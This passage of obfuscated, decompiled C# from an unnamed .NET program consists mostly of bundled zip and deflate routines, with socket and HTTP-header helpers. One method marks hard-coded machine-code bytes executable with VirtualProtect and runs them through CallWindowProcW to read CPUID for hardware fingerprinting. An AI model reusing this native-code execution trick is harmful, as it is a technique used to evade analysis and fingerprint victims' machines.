				gclass2_0.int_3 -= num;
				gclass2_0.class39_0.int_21 -= num;
				if (gclass2_0.class39_0.int_21 == 0)
				{
					gclass2_0.class39_0.int_20 = 0;
				}
				return;
			}
			throw new GException0(string.Format("Invalid State. (pending.Length={0}, pendingCount={1})", gclass2_0.class39_0.byte_0.Length, gclass2_0.class39_0.int_21));
		}

		static Encoding smethod_533(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.encoding_0;
			}
			if (class8_0.stream0_0 != null)
			{
				return class8_0.stream0_0.encoding_0;
			}
			return null;
		}

		static int smethod_534(bool bool_0, GClass2 gclass2_0)
		{
			if (gclass2_0.class44_0 != null)
			{
				throw new GException0("You may not call InitializeDeflate() after calling InitializeInflate().");
			}
			gclass2_0.class39_0 = new Class39();
			gclass2_0.class39_0.bool_1 = bool_0;
			Class39 class39_ = gclass2_0.class39_0;
			Enum20 enum20_ = gclass2_0.enum20_0;
			int int_ = gclass2_0.int_4;
			Enum21 enum21_ = gclass2_0.enum21_0;
			return Class16.smethod_265(enum21_, gclass2_0, class39_, enum20_, int_);
		}

		static void smethod_535(string string_0, string string_1, GClass1 gclass1_0)
		{
			if (File.Exists(string_0))
			{
				Class16.smethod_670(gclass1_0, string_0, string_1);
				return;
			}
			if (!Directory.Exists(string_0))
			{
				throw new FileNotFoundException(string.Format("That file or directory ({0}) does not exist!", string_0));
			}
			Class16.smethod_289(string_0, gclass1_0, string_1);
		}

		static StringDictionary smethod_536(Class62 class62_0, string string_0)
		{
			StringDictionary stringDictionary = new StringDictionary();
			string[] array = string_0.Replace("\r\n", "\n").Split(new char[]
			{
				'\n'
			});
			if (array.Length != 0)
			{
				int num = array[0].IndexOf(' ');
				if (num > 0)
				{
					class62_0.string_3 = array[0].Substring(0, num);
					array[0] = array[0].Substring(num).Trim();
				}
				num = array[0].LastIndexOf(' ');
				if (num > 0)
				{
					class62_0.string_2 = array[0].Substring(num).Trim();
					class62_0.string_1 = array[0].Substring(0, num);
				}
				else
				{
					class62_0.string_1 = array[0];
				}
				if (Class16.smethod_208(class62_0).Length >= 7 && Class16.smethod_208(class62_0).Substring(0, 7).ToLower().Equals("http://"))
				{
					num = Class16.smethod_208(class62_0).IndexOf('/', 7);
					if (num == -1)
					{
						class62_0.string_1 = "/";
					}
					else
					{
						class62_0.string_1 = Class16.smethod_208(class62_0).Substring(num);
					}
				}
			}
			for (int i = 1; i < array.Length; i++)
			{
				int num = array[i].IndexOf(":");
				if (num > 0 && num < array[i].Length - 1)
				{
					try
					{
						stringDictionary.Add(array[i].Substring(0, num), array[i].Substring(num + 1).Trim());
					}
					catch
					{
					}
				}
			}
			return stringDictionary;
		}

		static EventArgs2 smethod_537(string string_0)
		{
			return new EventArgs2(string_0, Enum6.const_2);
		}

		static void smethod_538(GClass0 gclass0_0, GClass1 gclass1_0, bool bool_0)
		{
			EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
			if (eventHandler_ != null)
			{
				EventArgs1 arg_40_0;
				if (!bool_0)
				{
					string archiveNameForEvent = gclass1_0.ArchiveNameForEvent;
					int count = gclass1_0.dictionary_0.Count;
					arg_40_0 = Class16.smethod_394(gclass0_0, count, archiveNameForEvent);
				}
				else
				{
					arg_40_0 = Class16.smethod_97(gclass1_0.ArchiveNameForEvent, gclass1_0.dictionary_0.Count);
				}
				EventArgs1 e = arg_40_0;
				eventHandler_(gclass1_0, e);
			}
		}

		static void smethod_539(Stream11 stream11_0, int int_0)
		{
			if (int_0 < 1024)
			{
				throw new ArgumentOutOfRangeException("BufferSize", "BufferSize must be greater than 1024 bytes");
			}
			stream11_0.int_3 = int_0;
		}

		static void smethod_540(Stream stream_0, GClass1 gclass1_0)
		{
			if (stream_0 == null)
			{
				throw new ArgumentNullException("outputStream");
			}
			if (!stream_0.CanWrite)
			{
				throw new ArgumentException("Must be a writable stream.", "outputStream");
			}
			gclass1_0.string_0 = null;
			gclass1_0.stream_1 = new Stream4(stream_0);
			gclass1_0.bool_5 = true;
			gclass1_0.bool_4 = false;
			Class16.smethod_341(gclass1_0);
		}

		static Socket smethod_541(Class64 class64_0)
		{
			return class64_0.socket_0;
		}

		static void smethod_542(GClass1 gclass1_0, string string_0)
		{
			string string_ = Class16.smethod_504(string_0, null);
			GClass0 gClass = gclass1_0[string_];
			if (gClass == null)
			{
				throw new ArgumentException("The entry you specified was not found in the zip archive.");
			}
			Class16.smethod_16(gclass1_0, gClass);
		}

		static int smethod_543(Enum2 enum2_0)
		{
			if (enum2_0 == Enum2.const_0)
			{
				return 0;
			}
			if (enum2_0 != Enum2.const_2)
			{
				if (enum2_0 != Enum2.const_3)
				{
					if (enum2_0 == Enum2.const_1)
					{
						return 12;
					}
					throw new ZipException("internal error");
				}
			}
			int num = Class16.smethod_176(enum2_0);
			return num / 8 / 2 + 2;
		}

		static int smethod_544(int int_0)
		{
			return Class38.int_0[int_0];
		}

		static bool smethod_545(TextWriter textWriter_0, string string_0, bool bool_0)
		{
			GClass1 gClass = null;
			GClass1 gClass2 = null;
			bool flag = true;
			try
			{
				gClass = new GClass1();
				gClass.FullScan = true;
				Class16.smethod_192(gClass, string_0);
				gClass2 = Class16.smethod_12(string_0);
				using (IEnumerator<GClass0> enumerator = gClass.System.Collections.Generic.IEnumerable<ns15.GClass0>.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						GClass0 current = enumerator.Current;
						using (IEnumerator<GClass0> enumerator2 = gClass2.System.Collections.Generic.IEnumerable<ns15.GClass0>.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								GClass0 current2 = enumerator2.Current;
								if (current.string_1 == current2.string_1)
								{
									if (current.long_4 != current2.long_4)
									{
										flag = false;
										if (textWriter_0 != null)
										{
											textWriter_0.WriteLine("{0}: mismatch in RelativeOffsetOfLocalHeader  (0x{1:X16} != 0x{2:X16})", current.string_1, current.long_4, current2.long_4);
										}
									}
									if (current.long_0 != current2.long_0)
									{
										flag = false;
										if (textWriter_0 != null)
										{
											textWriter_0.WriteLine("{0}: mismatch in CompressedSize  (0x{1:X16} != 0x{2:X16})", current.string_1, current.long_0, current2.long_0);
										}
									}
									if (current.long_2 != current2.long_2)
									{
										flag = false;
										if (textWriter_0 != null)
										{
											textWriter_0.WriteLine("{0}: mismatch in UncompressedSize  (0x{1:X16} != 0x{2:X16})", current.string_1, current.long_2, current2.long_2);
										}
									}
									if (current.short_8 != current2.short_8)
									{
										flag = false;
										if (textWriter_0 != null)
										{
											textWriter_0.WriteLine("{0}: mismatch in CompressionMethod  (0x{1:X4} != 0x{2:X4})", current.string_1, (CompressionMethod)current.short_8, (CompressionMethod)current2.short_8);
										}
									}
									if (current.int_2 != current2.int_2)
									{
										flag = false;
										if (textWriter_0 != null)
										{
											textWriter_0.WriteLine("{0}: mismatch in Crc32  (0x{1:X4} != 0x{2:X4})", current.string_1, current.int_2, current2.int_2);
										}
									}
									break;
								}
							}
						}
					}
				}
				gClass2.System.IDisposable.Dispose();
				gClass2 = null;
				if (!flag && bool_0)
				{
					string text = Path.GetFileNameWithoutExtension(string_0);
					text = string.Format("{0}_fixed.zip", text);
					Class16.smethod_565(gClass, text);
				}
			}
			finally
			{
				if (gClass != null)
				{
					gClass.System.IDisposable.Dispose();
				}
				if (gClass2 != null)
				{
					gClass2.System.IDisposable.Dispose();
				}
			}
			return flag;
		}

		static bool smethod_546(short[] short_0, int int_0, int int_1, sbyte[] sbyte_0)
		{
			short num = short_0[int_0 * 2];
			short num2 = short_0[int_1 * 2];
			return num < num2 || (num == num2 && sbyte_0[int_0] <= sbyte_0[int_1]);
		}

		static void smethod_547(Class39 class39_0, short[] short_0, int int_0)
		{
			int num = class39_0.int_40[int_0];
			for (int i = int_0 << 1; i <= class39_0.int_41; i <<= 1)
			{
				if (i < class39_0.int_41 && Class16.smethod_546(short_0, class39_0.int_40[i + 1], class39_0.int_40[i], class39_0.sbyte_1))
				{
					i++;
				}
				if (Class16.smethod_546(short_0, num, class39_0.int_40[i], class39_0.sbyte_1))
				{
					break;
				}
				class39_0.int_40[int_0] = class39_0.int_40[i];
				int_0 = i;
			}
			class39_0.int_40[int_0] = num;
		}

		static GClass0 smethod_548(string string_0, GClass1 gclass1_0, byte[] byte_0)
		{
			if (byte_0 == null)
			{
				throw new ArgumentException("bad argument", "byteContent");
			}
			MemoryStream stream_ = new MemoryStream(byte_0);
			return Class16.smethod_632(stream_, string_0, gclass1_0);
		}

		static Enum8 smethod_549(Stream0 stream0_0)
		{
			return stream0_0.enum8_0;
		}

		static void smethod_550(GClass1 gclass1_0)
		{
			Stream readStream = gclass1_0.ReadStream;
			byte[] array = new byte[16];
			readStream.Seek(-40L, SeekOrigin.Current);
			readStream.Read(array, 0, 16);
			long num = BitConverter.ToInt64(array, 8);
			gclass1_0.uint_2 = 4294967295u;
			gclass1_0.long_1 = num;
			readStream.Seek(num, SeekOrigin.Begin);
			uint num2 = (uint)Class16.smethod_89(readStream);
			if (num2 != 101075792u)
			{
				throw new BadReadException(string.Format("  Bad signature (0x{0:X8}) looking for ZIP64 EoCD Record at position 0x{1:X8}", num2, readStream.Position));
			}
			readStream.Read(array, 0, 8);
			long num3 = BitConverter.ToInt64(array, 0);
			array = new byte[num3];
			readStream.Read(array, 0, array.Length);
			num = BitConverter.ToInt64(array, 36);
			readStream.Seek(num, SeekOrigin.Begin);
		}

		static void smethod_551(Form1.Class1 class1_0)
		{
			class1_0.int_0 = -1;
			if (class1_0.ienumerator_1 != null)
			{
				class1_0.ienumerator_1.Dispose();
			}
		}

		static long smethod_552(string string_0)
		{
			if (!File.Exists(string_0))
			{
				throw new FileNotFoundException(string_0);
			}
			long result = 0L;
			using (FileStream fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.Read | FileShare.Write | FileShare.Delete))
			{
				result = fileStream.Length;
			}
			return result;
		}

		static int smethod_553(Class74.Class77 class77_0)
		{
			return 32768 - class77_0.int_1;
		}

		static GClass0 smethod_554(Encoding encoding_0, string string_0, GClass1 gclass1_0, string string_1)
		{
			Class16.smethod_441(string_0, gclass1_0);
			return Class16.smethod_96(string_1, string_0, encoding_0, gclass1_0);
		}

		[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool VirtualProtect([In] byte[] byte_0, IntPtr intptr_0, int int_0, out int int_1);

		static void smethod_555(Stream3 stream3_0, byte[] byte_0, int int_0)
		{
			Array.Copy(BitConverter.GetBytes(stream3_0.int_0++), 0, stream3_0.byte_0, 0, 4);
			stream3_0.icryptoTransform_0.TransformBlock(stream3_0.byte_0, 0, 16, stream3_0.byte_1, 0);
			Class16.smethod_312(stream3_0, byte_0, int_0, 16);
			stream3_0.hmacsha1_0.TransformBlock(byte_0, int_0, 16, null, 0);
		}

		static bool smethod_556(Class64 class64_0)
		{
			return class64_0.bool_0;
		}

		static int smethod_557(GClass2 gclass2_0)
		{
			if (gclass2_0.class39_0 == null)
			{
				throw new GException0("No Deflate State!");
			}
			gclass2_0.class39_0 = null;
			return 0;
		}

		static int smethod_558(int int_0, int int_1)
		{
			return (int)((uint)int_0 >> int_1);
		}

		static string smethod_559(string string_0, string string_1, string string_2)
		{
			string text = string_1.ToUpper();
			string text2 = string_0.ToUpper();
			int num = text.IndexOf(text2);
			if (num != 0)
			{
				return string_1;
			}
			return string_2 + string_1.Substring(text2.Length);
		}

		static void smethod_560(GClass0 gclass0_0, string string_0)
		{
			if (gclass0_0.class8_0.gclass1_0 != null)
			{
				gclass0_0.bool_12 = Class16.smethod_676(string_0, gclass0_0, gclass0_0.class8_0.gclass1_0);
			}
		}

		static void smethod_561(string string_0, Class54 class54_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			class54_0.string_0 = string_0;
		}

		static void smethod_562(GClass1 gclass1_0, IEnumerable<string> ienumerable_0)
		{
			Class16.smethod_661(null, ienumerable_0, gclass1_0);
		}

		static void smethod_563(short[] short_0, int int_0, Class39 class39_0)
		{
			int num = -1;
			int num2 = (int)short_0[1];
			int num3 = 0;
			int num4 = 7;
			int num5 = 4;
			if (num2 == 0)
			{
				num4 = 138;
				num5 = 3;
			}
			for (int i = 0; i <= int_0; i++)
			{
				int num6 = num2;
				num2 = (int)short_0[(i + 1) * 2 + 1];
				if (++num3 >= num4 || num6 != num2)
				{
					if (num3 < num5)
					{
						do
						{
							Class16.smethod_338(class39_0, num6, class39_0.short_4);
						}
						while (--num3 != 0);
					}
					else if (num6 != 0)
					{
						if (num6 != num)
						{
							Class16.smethod_338(class39_0, num6, class39_0.short_4);
							num3--;
						}
						Class16.smethod_338(class39_0, Class49.int_7, class39_0.short_4);
						Class16.smethod_371(class39_0, num3 - 3, 2);
					}
					else if (num3 <= 10)
					{
						Class16.smethod_338(class39_0, Class49.int_8, class39_0.short_4);
						Class16.smethod_371(class39_0, num3 - 3, 3);
					}
					else
					{
						Class16.smethod_338(class39_0, Class49.int_9, class39_0.short_4);
						Class16.smethod_371(class39_0, num3 - 11, 7);
					}
					num3 = 0;
					num = num6;
					if (num2 == 0)
					{
						num4 = 138;
						num5 = 3;
					}
					else if (num6 == num2)
					{
						num4 = 6;
						num5 = 3;
					}
					else
					{
						num4 = 7;
						num5 = 4;
					}
				}
			}
		}

		static void smethod_564(GClass1 gclass1_0)
		{
			EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
			if (eventHandler_ != null)
			{
				EventArgs1 e = Class16.smethod_152(gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, e);
			}
		}

		static void smethod_565(GClass1 gclass1_0, string string_0)
		{
			if (gclass1_0.string_0 == null)
			{
				gclass1_0.stream_1 = null;
			}
			else
			{
				gclass1_0.string_1 = gclass1_0.string_0;
			}
			gclass1_0.string_0 = string_0;
			if (Directory.Exists(gclass1_0.string_0))
			{
				throw new ZipException("Bad Directory", new ArgumentException("That name specifies an existing directory. Please specify a filename.", "fileName"));
			}
			gclass1_0.bool_5 = true;
			gclass1_0.bool_4 = File.Exists(gclass1_0.string_0);
			Class16.smethod_341(gclass1_0);
		}

		static bool smethod_566(Class11 class11_0, DateTime dateTime_0)
		{
			bool result;
			switch (class11_0.comparisonOperator_0)
			{
			case ComparisonOperator.GreaterThan:
				result = (dateTime_0 > class11_0.dateTime_0);
				break;
			case ComparisonOperator.GreaterThanOrEqualTo:
				result = (dateTime_0 >= class11_0.dateTime_0);
				break;
			case ComparisonOperator.LesserThan:
				result = (dateTime_0 < class11_0.dateTime_0);
				break;
			case ComparisonOperator.LesserThanOrEqualTo:
				result = (dateTime_0 <= class11_0.dateTime_0);
				break;
			case ComparisonOperator.EqualTo:
				result = (dateTime_0 == class11_0.dateTime_0);
				break;
			case ComparisonOperator.NotEqualTo:
				result = (dateTime_0 != class11_0.dateTime_0);
				break;
			default:
				throw new ArgumentException("Operator");
			}
			return result;
		}

		static void smethod_567(Class32 class32_0)
		{
			Class16.smethod_442(class32_0);
			if (class32_0.int_0 > 0)
			{
				byte value = (byte)(class32_0.uint_0 >> 24 & 255u);
				class32_0.stream_0.WriteByte(value);
				class32_0.int_1++;
			}
		}

		static string smethod_568(string string_0)
		{
			string[][] array = new string[][]
			{
				new string[]
				{
					"([^']*)\\(\\(([^']+)",
					"$1( ($2"
				},
				new string[]
				{
					"(.)\\)\\)",
					"$1) )"
				},
				new string[]
				{
					"\\((\\S)",
					"( $1"
				},
				new string[]
				{
					"(\\S)\\)",
					"$1 )"
				},
				new string[]
				{
					"^\\)",
					" )"
				},
				new string[]
				{
					"(\\S)\\(",
					"$1 ("
				},
				new string[]
				{
					"\\)(\\S)",
					") $1"
				},
				new string[]
				{
					"(=)('[^']*')",
					"$1 $2"
				},
				new string[]
				{
					"([^ !><])(>|<|!=|=)",
					"$1 $2"
				},
				new string[]
				{
					"(>|<|!=|=)([^ =])",
					"$1 $2"
				},
				new string[]
				{
					"/",
					"\\"
				}
			};
			string input = string_0;
			for (int i = 0; i < array.Length; i++)
			{
				string pattern = Class17.Class18.string_2 + array[i][0] + Class17.Class18.string_3;
				input = Regex.Replace(input, pattern, array[i][1]);
			}
			string pattern2 = "/" + Class17.Class18.string_1;
			input = Regex.Replace(input, pattern2, "\\");
			pattern2 = " " + Class17.Class18.string_1;
			return Regex.Replace(input, pattern2, "\u0006");
		}

		static void smethod_569(GClass1 gclass1_0)
		{
			StringComparer comparer = gclass1_0.bool_0 ? StringComparer.Ordinal : StringComparer.OrdinalIgnoreCase;
			gclass1_0.dictionary_0 = ((gclass1_0.dictionary_0 == null) ? new Dictionary<string, GClass0>(comparer) : new Dictionary<string, GClass0>(gclass1_0.dictionary_0, comparer));
		}

		static void smethod_570(Stream6 stream6_0)
		{
			if (stream6_0.int_8 != stream6_0.int_9)
			{
				stream6_0.enum11_0 = Stream6.Enum11.const_2;
				stream6_0.int_7 = 1;
				Class16.smethod_280(stream6_0);
				return;
			}
			if (++stream6_0.int_7 >= 4)
			{
				stream6_0.char_0 = (char)(stream6_0.class35_0.byte_5[stream6_0.int_14] & 255);
				stream6_0.int_14 = stream6_0.class35_0.int_6[stream6_0.int_14];
				if (stream6_0.int_12 == 0)
				{
					stream6_0.int_12 = Class16.smethod_544(stream6_0.int_13) - 1;
					if (++stream6_0.int_13 == 512)
					{
						stream6_0.int_13 = 0;
					}
				}
				else
				{
					stream6_0.int_12--;
				}
				stream6_0.int_11 = 0;
				stream6_0.enum11_0 = Stream6.Enum11.const_4;
				if (stream6_0.int_12 == 1)
				{
					stream6_0.char_0 ^= '\u0001';
				}
				Class16.smethod_486(stream6_0);
				return;
			}
			stream6_0.enum11_0 = Stream6.Enum11.const_2;
			Class16.smethod_280(stream6_0);
		}

		static void smethod_571(Stream9 stream9_0, Enum21 enum21_0)
		{
			if (stream9_0.bool_0)
			{
				throw new ObjectDisposedException("DeflateStream");
			}
			stream9_0.stream12_0.enum21_0 = enum21_0;
		}

		static void smethod_572(Stream3 stream3_0)
		{
			if (stream3_0.int_1 == 0)
			{
				throw new InvalidOperationException("No bytes available.");
			}
			if (stream3_0.bool_0)
			{
				throw new InvalidOperationException("The final block has already been transformed.");
			}
			Array.Copy(BitConverter.GetBytes(stream3_0.int_0++), 0, stream3_0.byte_0, 0, 4);
			stream3_0.byte_1 = stream3_0.icryptoTransform_0.TransformFinalBlock(stream3_0.byte_0, 0, 16);
			Class16.smethod_312(stream3_0, stream3_0.byte_2, 0, stream3_0.int_1);
			stream3_0.hmacsha1_0.TransformFinalBlock(stream3_0.byte_2, 0, stream3_0.int_1);
			stream3_0.bool_0 = true;
		}

		static void smethod_573(IPEndPoint ipendPoint_0, Class54 class54_0)
		{
			class54_0.ipendPoint_0 = ipendPoint_0;
		}

		static void smethod_574(int int_0, Class33 class33_0, int int_1)
		{
			Class16.smethod_478(class33_0.class32_0, 3, (uint)int_0);
			Class16.smethod_478(class33_0.class32_0, 15, (uint)int_1);
			byte[] byte_ = class33_0.class34_0.byte_2;
			for (int i = 0; i < int_1; i++)
			{
				int j = 0;
				int num = (int)(byte_[i] & 255);
				while (j < num)
				{
					Class16.smethod_478(class33_0.class32_0, 1, 1u);
					j++;
				}
				Class16.smethod_478(class33_0.class32_0, 1, 0u);
			}
		}

		static string smethod_575(Stream10 stream10_0)
		{
			return stream10_0.string_0;
		}

		static int smethod_576(Class39 class39_0, int int_0)
		{
			int num = class39_0.class40_0.int_3;
			int num2 = class39_0.int_36;
			int num3 = class39_0.int_39;
			int num4 = (class39_0.int_36 > class39_0.int_23 - Class39.int_16) ? (class39_0.int_36 - (class39_0.int_23 - Class39.int_16)) : 0;
			int num5 = class39_0.class40_0.int_2;
			int int_ = class39_0.int_25;
			int num6 = class39_0.int_36 + Class39.int_15;
			byte b = class39_0.byte_1[num2 + num3 - 1];
			byte b2 = class39_0.byte_1[num2 + num3];
			if (class39_0.int_39 >= class39_0.class40_0.int_0)
			{
				num >>= 2;
			}
			if (num5 > class39_0.int_38)
			{
				num5 = class39_0.int_38;
			}
			do
			{
				int num7 = int_0;
				if (class39_0.byte_1[num7 + num3] == b2 && class39_0.byte_1[num7 + num3 - 1] == b && class39_0.byte_1[num7] == class39_0.byte_1[num2] && class39_0.byte_1[++num7] == class39_0.byte_1[num2 + 1])
				{
					num2 += 2;
					num7++;
					while (class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && class39_0.byte_1[++num2] == class39_0.byte_1[++num7] && num2 < num6)
					{
					}
					int num8 = Class39.int_15 - (num6 - num2);
					num2 = num6 - Class39.int_15;
					if (num8 > num3)
					{
						class39_0.int_37 = int_0;
						num3 = num8;
						if (num8 >= num5)
						{
							break;
						}
						b = class39_0.byte_1[num2 + num3 - 1];
						b2 = class39_0.byte_1[num2 + num3];
					}
				}
				if ((int_0 = ((int)class39_0.short_0[int_0 & int_] & 65535)) <= num4)
				{
					break;
				}
			}
			while (--num != 0);
			if (num3 <= class39_0.int_38)
			{
				return num3;
			}
			return class39_0.int_38;
		}

		static void smethod_577(Class74.Class76 class76_0)
		{
			class76_0.uint_0 >>= (class76_0.int_2 & 7);
			class76_0.int_2 &= -8;
		}

		static void smethod_578(Class64 class64_0)
		{
			if (Class16.smethod_541(class64_0) != null)
			{
				Class16.smethod_541(class64_0).Close();
				Class16.smethod_301(class64_0);
			}
		}

		static uint smethod_579(ZipSegmentedStream zipSegmentedStream_0)
		{
			return zipSegmentedStream_0.uint_0;
		}

		static void smethod_580(Class39 class39_0)
		{
			class39_0.class47_0.short_0 = class39_0.short_2;
			class39_0.class47_0.class50_0 = Class50.class50_0;
			class39_0.class47_1.short_0 = class39_0.short_3;
			class39_0.class47_1.class50_0 = Class50.class50_1;
			class39_0.class47_2.short_0 = class39_0.short_4;
			class39_0.class47_2.class50_0 = Class50.class50_2;
			class39_0.short_6 = 0;
			class39_0.int_51 = 0;
			class39_0.int_50 = 8;
			Class16.smethod_306(class39_0);
		}

		static long smethod_581(Stream stream_0, int int_0)
		{
			long position = stream_0.Position;
			byte[] array = new byte[]
			{
				(byte)(int_0 >> 24),
				(byte)((int_0 & 16711680) >> 16),
				(byte)((int_0 & 65280) >> 8),
				(byte)(int_0 & 255)
			};
			byte[] array2 = new byte[65536];
			bool flag = false;
			do
			{
				int num = stream_0.Read(array2, 0, array2.Length);
				if (num == 0)
				{
					break;
				}
				for (int i = 0; i < num; i++)
				{
					if (array2[i] == array[3])
					{
						long position2 = stream_0.Position;
						stream_0.Seek((long)(i - num), SeekOrigin.Current);
						int num2 = Class16.smethod_456(stream_0);
						if (flag = (num2 == int_0))
						{
							break;
						}
						stream_0.Seek(position2, SeekOrigin.Begin);
					}
				}
			}
			while (!flag);
			if (!flag)
			{
				stream_0.Seek(position, SeekOrigin.Begin);
				return -1L;
			}
			return stream_0.Position - position - 4L;
		}

		static void smethod_582(Class39 class39_0)
		{
			Class16.smethod_371(class39_0, Class39.int_8 << 1, 3);
			Class16.smethod_338(class39_0, Class39.int_18, Class50.short_0);
			Class16.smethod_110(class39_0);
			if (1 + class39_0.int_50 + 10 - class39_0.int_51 < 9)
			{
				Class16.smethod_371(class39_0, Class39.int_8 << 1, 3);
				Class16.smethod_338(class39_0, Class39.int_18, Class50.short_0);
				Class16.smethod_110(class39_0);
			}
			class39_0.int_50 = 7;
		}

		static int smethod_583(int int_0, GClass2 gclass2_0, Class44 class44_0)
		{
			class44_0.gclass2_0 = gclass2_0;
			class44_0.gclass2_0.string_0 = null;
			class44_0.class41_0 = null;
			if (int_0 >= 8 && int_0 <= 15)
			{
				class44_0.int_2 = int_0;
				class44_0.class41_0 = new Class41(gclass2_0, class44_0.bool_0 ? class44_0 : null, 1 << int_0);
				Class16.smethod_345(class44_0);
				return 0;
			}
			Class16.smethod_72(class44_0);
			throw new GException0("Bad window size.");
		}

		static void smethod_584(Stream7 stream7_0)
		{
			Class16.smethod_524(stream7_0.class32_0, 23);
			Class16.smethod_524(stream7_0.class32_0, 114);
			Class16.smethod_524(stream7_0.class32_0, 69);
			Class16.smethod_524(stream7_0.class32_0, 56);
			Class16.smethod_524(stream7_0.class32_0, 80);
			Class16.smethod_524(stream7_0.class32_0, 144);
			Class32 class32_ = stream7_0.class32_0;
			uint uint_ = stream7_0.uint_0;
			Class16.smethod_156(uint_, class32_);
			Class16.smethod_567(stream7_0.class32_0);
		}

		static void smethod_585(ICollection<GClass0> icollection_0)
		{
			foreach (GClass0 current in icollection_0)
			{
				Class16.smethod_238(current);
			}
		}

		static byte[] smethod_586(Class20 class20_0)
		{
			return class20_0.byte_0;
		}

		static void smethod_587(EventArgs0 eventArgs0_0, GClass0 gclass0_0)
		{
			eventArgs0_0.gclass0_0 = gclass0_0;
		}

		static void smethod_588(Class74.Class77 class77_0, int int_0, int int_1)
		{
			if ((class77_0.int_1 += int_0) > 32768)
			{
				throw new InvalidOperationException();
			}
			int num = class77_0.int_0 - int_1 & 32767;
			int num2 = 32768 - int_0;
			if (num > num2 || class77_0.int_0 >= num2)
			{
				Class16.smethod_236(class77_0, num, int_0, int_1);
				return;
			}
			if (int_0 <= int_1)
			{
				Array.Copy(class77_0.byte_0, num, class77_0.byte_0, class77_0.int_0, int_0);
				class77_0.int_0 += int_0;
				return;
			}
			while (int_0-- > 0)
			{
				class77_0.byte_0[class77_0.int_0++] = class77_0.byte_0[num++];
			}
		}

		static void smethod_589(Class33 class33_0)
		{
			if (class33_0.int_2 > 0)
			{
				Class16.smethod_408(class33_0, true);
			}
			class33_0.int_1 = -1;
			if (class33_0.int_3 == -1)
			{
				return;
			}
			Class16.smethod_5(class33_0);
			Class16.smethod_524(class33_0.class32_0, 49);
			Class16.smethod_524(class33_0.class32_0, 65);
			Class16.smethod_524(class33_0.class32_0, 89);
			Class16.smethod_524(class33_0.class32_0, 38);
			Class16.smethod_524(class33_0.class32_0, 83);
			Class16.smethod_524(class33_0.class32_0, 89);
			class33_0.method_1(~class33_0.gclass3_0.uint_2);
			Class32 class32_ = class33_0.class32_0;
			uint uint_ = class33_0.method_0();
			Class16.smethod_156(uint_, class32_);
			Class16.smethod_478(class33_0.class32_0, 1, class33_0.bool_1 ? 1u : 0u);
			Class16.smethod_0(class33_0);
			Class16.smethod_234(class33_0);
		}

		static void smethod_590(bool bool_0, GClass0 gclass0_0, string string_0)
		{
			try
			{
				if (gclass0_0.bool_0)
				{
					if (bool_0)
					{
						if (File.Exists(string_0))
						{
							File.SetCreationTimeUtc(string_0, gclass0_0.dateTime_3);
							File.SetLastAccessTimeUtc(string_0, gclass0_0.dateTime_2);
							File.SetLastWriteTimeUtc(string_0, gclass0_0.dateTime_1);
						}
					}
					else if (Directory.Exists(string_0))
					{
						Directory.SetCreationTimeUtc(string_0, gclass0_0.dateTime_3);
						Directory.SetLastAccessTimeUtc(string_0, gclass0_0.dateTime_2);
						Directory.SetLastWriteTimeUtc(string_0, gclass0_0.dateTime_1);
					}
				}
				else
				{
					DateTime lastWriteTime = Class16.smethod_30(gclass0_0.LastModified);
					if (bool_0)
					{
						File.SetLastWriteTime(string_0, lastWriteTime);
					}
					else
					{
						Directory.SetLastWriteTime(string_0, lastWriteTime);
					}
				}
			}
			catch (IOException ex)
			{
				Class16.smethod_529(gclass0_0, "failed to set time on {0}: {1}", new object[]
				{
					string_0,
					ex.Message
				});
			}
		}

		static bool smethod_591(ref byte[] byte_0)
		{
			byte[] array = new byte[]
			{
				85,
				137,
				229,
				87,
				139,
				125,
				16,
				106,
				1,
				88,
				83,
				15,
				162,
				137,
				7,
				137,
				87,
				4,
				91,
				95,
				137,
				236,
				93,
				194,
				16,
				0
			};
			byte[] array2 = new byte[]
			{
				83,
				72,
				199,
				192,
				1,
				0,
				0,
				0,
				15,
				162,
				65,
				137,
				0,
				65,
				137,
				80,
				4,
				91,
				195
			};
			bool result;
			if (Class16.smethod_39())
			{
				IntPtr intPtr = new IntPtr(array2.Length);
				int num;
				if (!Class16.VirtualProtect(array2, intPtr, 64, out num))
				{
					Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
				}
				intPtr = new IntPtr(byte_0.Length);
				result = (Class16.CallWindowProcW(array2, IntPtr.Zero, 0, byte_0, intPtr) != IntPtr.Zero);
			}
			else
			{
				IntPtr intPtr2 = new IntPtr(array.Length);
				int num;
				if (!Class16.VirtualProtect(array, intPtr2, 64, out num))
				{
					Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
				}
				intPtr2 = new IntPtr(byte_0.Length);
				result = (Class16.CallWindowProcW(array, IntPtr.Zero, 0, byte_0, intPtr2) != IntPtr.Zero);
			}
			return result;
		}

		static void smethod_592(GClass0 gclass0_0, Stream stream_0)
		{
			Stream4 stream = stream_0 as Stream4;
			ZipSegmentedStream zipSegmentedStream = stream_0 as ZipSegmentedStream;
			bool flag = false;
			do
			{
				try
				{
					if (gclass0_0.enum0_0 == Enum0.const_3 && !gclass0_0.bool_7)
					{
						Class16.smethod_355(stream_0, gclass0_0);
						break;
					}
					if (gclass0_0.bool_4)
					{
						Class16.smethod_135(gclass0_0, stream_0, 1);
						Class16.smethod_323(gclass0_0);
						gclass0_0.nullable_1 = new bool?(gclass0_0.long_4 >= (long)((ulong)-1));
						gclass0_0.nullable_2 = new bool?(Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_3 || gclass0_0.nullable_1.Value);
						if (zipSegmentedStream != null)
						{
